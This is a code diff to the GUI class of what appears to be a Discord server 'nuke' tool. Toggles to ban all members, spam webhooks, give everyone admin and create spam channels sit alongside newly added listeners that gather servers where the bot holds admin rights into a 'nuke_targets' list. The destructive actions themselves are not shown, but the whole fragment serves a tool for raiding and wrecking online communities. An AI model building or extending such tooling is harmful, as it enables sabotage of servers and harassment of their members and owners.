@@ -185,22 +185,50 @@ public class mainClass extends JPanel {
                 webhookSpamToggle.setText(configuration.webhookSpam().toString().toUpperCase());
                 adminEveryoneToggle.setText(configuration.giveEveryoneAdmin().toString().toUpperCase());
                 this.configuration = configuration;
+
+                bot_api.addServerJoinListener(update ->{
+                    loggedInAs.setText("Logged in as " + bot_api.getYourself().getDiscriminatedName());
+                    for(Server server : bot_api.getServers().toArray(new Server[0])){
+                        if(server.isAdmin(bot_api.getYourself())){
+                            nuke_targets.add(server);
+                        }
+                    }
+
+                    serverList.removeAllItems();
+                    for (int i = 0; i < nuke_targets.size(); i++) {
+                        serverList.addItem(nuke_targets.get(i).getName() + " (" + nuke_targets.get(i).getIdAsString() + ")");
+                    }
+                });
+
+                bot_api.addServerLeaveListener(update ->{
+                    loggedInAs.setText("Logged in as " + bot_api.getYourself().getDiscriminatedName());
+                    for(Server server : bot_api.getServers().toArray(new Server[0])){
+                        if(server.isAdmin(bot_api.getYourself())){
+                            nuke_targets.add(server);
+                        }
+                    }
+
+                    serverList.removeAllItems();
+                    for (int i = 0; i < nuke_targets.size(); i++) {
+                        serverList.addItem(nuke_targets.get(i).getName() + " (" + nuke_targets.get(i).getIdAsString() + ")");
+                    }
+                });
             }
         });
 
         banEveryoneToggle.addActionListener(toggle ->{
-            configuration.setBanAllMembers(banEveryoneToggle.isEnabled());
-            banEveryoneToggle.setText(String.valueOf(banEveryoneToggle.isEnabled()).toUpperCase());
+            configuration.setBanAllMembers(banEveryoneToggle.isSelected());
+            banEveryoneToggle.setText(String.valueOf(banEveryoneToggle.isSelected()).toUpperCase());
         });
 
         webhookSpamToggle.addActionListener(toggle ->{
-            configuration.setWebhookSpam(webhookSpamToggle.isEnabled());
-            webhookSpamToggle.setText(String.valueOf(webhookSpamToggle.isEnabled()).toUpperCase());
+            configuration.setWebhookSpam(webhookSpamToggle.isSelected());
+            webhookSpamToggle.setText(String.valueOf(webhookSpamToggle.isSelected()).toUpperCase());
         });
 
         adminEveryoneToggle.addActionListener(toggle ->{
-            configuration.setGiveEveryoneAdmin(adminEveryoneToggle.isEnabled());
-            adminEveryoneToggle.setText(String.valueOf(adminEveryoneToggle.isEnabled()).toUpperCase());
+            configuration.setGiveEveryoneAdmin(adminEveryoneToggle.isSelected());
+            adminEveryoneToggle.setText(String.valueOf(adminEveryoneToggle.isSelected()).toUpperCase());
         });
 
         addSpamChannelButton.addActionListener(addChannelName ->{
